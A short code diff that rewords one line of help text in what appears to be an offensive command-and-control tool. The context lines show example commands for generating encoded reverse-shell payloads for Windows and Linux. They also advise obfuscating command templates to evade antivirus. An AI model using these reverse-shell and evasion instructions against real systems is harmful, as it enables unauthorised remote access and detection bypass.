@@ -151,7 +151,7 @@ class PrompHelp:
 			\r {ORANGE}generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode{END}
 			\r {ORANGE}generate payload=linux/hoaxshell/sh_curl lhost=eth0{END}
 			\r
-			\r  - The ENCODE and OBFUSCATE keywords are enabled for certain templates and can be used during payload generation. 
+			\r  - The ENCODE and OBFUSCATE attributes are enabled for certain templates and can be used during payload generation. 
 			\r  - For info on a particular template, use "generate" with PAYLOAD being the only provided argument.
 			\r  - To catch HoaxShell https-based reverse shells you need to start Villain with SSL.
 			\r  - Ultimately, one should edit the templates and add obfuscated versions of the commands for AV evasion.
